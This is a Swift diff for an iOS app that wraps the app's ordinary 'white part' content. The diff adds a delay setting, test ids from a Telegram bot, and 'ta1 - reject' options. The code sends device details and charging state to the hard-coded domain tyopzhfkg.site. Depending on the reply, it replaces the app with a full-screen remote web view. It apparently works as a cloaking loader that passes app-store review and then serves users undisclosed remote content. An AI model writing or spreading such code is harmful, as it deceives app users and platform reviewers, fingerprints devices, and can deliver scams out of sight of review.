@@ -8,10 +8,16 @@
 import WebKit
 import SwiftUI
 
-public struct ContenViewWithRequest<Content: View>: View {
+struct ContentViewWithRequest<Content: View>: View {
     @StateObject private var appRequest = AppRequest()
+    
+    /// as content use your white part
+    /// you can change initializator or remove Content
     @ViewBuilder var content: Content
-    public var body: some View {
+    // MARK: - TODO
+    // parameter delay must be specified as the opening time in milliseconds
+    private let delay = 0
+    var body: some View {
         ZStack {
             switch appRequest.state {
             case .main:
@@ -27,7 +33,7 @@ public struct ContenViewWithRequest<Content: View>: View {
             }
         }    
         .onAppear {
-            if Date().ms > 0 {
+            if Date().ms > delay {
                 if !ServiceStorage.shared.checkKeyExist() {
                     do {
                         try appRequest.request()
@@ -42,11 +48,11 @@ public struct ContenViewWithRequest<Content: View>: View {
     }
 }
 
-public struct ServiceView: UIViewRepresentable {
+struct ServiceView: UIViewRepresentable {
     let url: String
     let appRequest: AppRequest
     
-    public func makeUIView(context: Context) -> some UIView {
+    func makeUIView(context: Context) -> some UIView {
         guard let url = URL(string: self.url) else {
             return WKWebView()
         }
@@ -61,15 +67,15 @@ public struct ServiceView: UIViewRepresentable {
         return wkWebView
     }
     
-    public func updateUIView(_ uiView: UIViewType, context: Context) {
+    func updateUIView(_ uiView: UIViewType, context: Context) {
         
     }
     
-    public func makeCoordinator() -> Coordinator {
+    func makeCoordinator() -> Coordinator {
         Coordinator(appRequest)
     }
     
-    public class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
+    class Coordinator: NSObject, WKNavigationDelegate, WKUIDelegate {
         
         var request: AppRequest
         
@@ -77,7 +83,7 @@ public struct ServiceView: UIViewRepresentable {
             self.request = request
         }
         
-        public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void)
+        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void)
         {
             switch navigationAction.request.url?.scheme {
             case "tel":
@@ -99,14 +105,14 @@ public struct ServiceView: UIViewRepresentable {
                 decisionHandler(.allow)
             }
         }
-        public func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
+        func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
             let code = error._code
             if code == -1200 || code == -1003 {
                 request.setError(code)
             }
         }
         
-        public func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
+        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
             if navigationAction.targetFrame == nil {
                 webView.load(navigationAction.request)
             }
@@ -115,11 +121,11 @@ public struct ServiceView: UIViewRepresentable {
     }
 }
 
-public struct ErrorView: View {
+struct ErrorView: View {
     var request: AppRequest
     let color = Color.black
     let colorbb = Color(red: 0, green: 124, blue: 241)
-    public var body: some View {
+    var body: some View {
         ZStack {
             VStack {
                 Spacer()
@@ -148,18 +154,24 @@ public struct ErrorView: View {
     }
 }
 
-public struct ServiceConst {
+struct ServiceConst {
     static let userAgent = "Mozilla/5.0 (\(UIDevice.current.model); CPU \(UIDevice.current.model) OS \(UIDevice.current.systemVersion.replacingOccurrences(of: ".", with: "_")) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/\(UIDevice.current.systemVersion) Mobile/15E148 Safari/604.1"
     static let baseUrl = "https://tyopzhfkg.site/"
+    // MARK: - TODO
+    /// parameter id generated with tg bot
+    /// for testing
+    /// ta1 - reject
+    /// ta2 - 1w link
+    /// ta3 - disabled ssl
     static let id = ""
 }
 
-public class ServiceStorage {
+class ServiceStorage {
     static let shared = ServiceStorage()
     
     @AppStorage("SERVICE_APP_KEY") private(set) var key: String = ""
     
-    public func checkKeyExist() -> Bool {
+    func checkKeyExist() -> Bool {
         if self.key.isEmpty || self.key == "" {
             return false
         } else {
@@ -167,16 +179,16 @@ public class ServiceStorage {
         }
     }
     
-    public func setKeyValue(key: String) {
+    func setKeyValue(key: String) {
         self.key = key
     }
 }
 
-public enum ServiceRequest {
+enum ServiceRequest {
     case main, service, error
 }
 
-public class AppRequest: ObservableObject {
+class AppRequest: ObservableObject {
     @Published var state: ServiceRequest = .main
     @Published var errorCode = 0
     func setError(_ error: Int) {
@@ -217,7 +229,11 @@ public class AppRequest: ObservableObject {
         return "\(UIDevice.current.model) \(UIDevice.current.systemName) \(UIDevice.current.systemVersion) \(UIDevice.current.name) \(UIDevice.modelName)"
     }
     
-    public func request() throws {
+    func request() throws {
+        
+        // MARK: - TODO
+        /// for testing
+        /// let json: [String: Any] = ["us": false, "devi": "iPhone"]
         let json: [String: Any] = ["us": charging(), "devi": device()]
         let jsonData = try? JSONSerialization.data(withJSONObject: json)
         guard let url = URL(string: ServiceConst.baseUrl + ServiceConst.id) else {
@@ -251,7 +267,7 @@ public class AppRequest: ObservableObject {
         task.resume()
     }
     
-    public func setState(state: ServiceRequest, completion: @escaping () -> Void = {}) {
+    func setState(state: ServiceRequest, completion: @escaping () -> Void = {}) {
         DispatchQueue.main.async {
             completion()
             self.state = state
@@ -259,17 +275,17 @@ public class AppRequest: ObservableObject {
     }
 }
 
-public enum MError: Error {
+enum MError: Error {
     case merror
 }
 
-public extension Date {
+extension Date {
     var ms: Int64 {
         Int64((self.timeIntervalSince1970 * 1000.0).rounded())
     }
 }
 
-public extension String {
+extension String {
     func contains(_ strings: [String]) -> Bool {
         strings.contains { contains($0) }
     }
@@ -286,6 +302,9 @@ private extension UIDevice {
             return identifier + String(UnicodeScalar(UInt8(value)))
         }
         
+        
+        // MARK: - CHECK
+        /// if new iphone models appears, expand the map
         func idMap(_ identifier: String) -> String {
             let map: [String : String] = [
                 "iPod5,1" : "iPod touch (5th generation)",
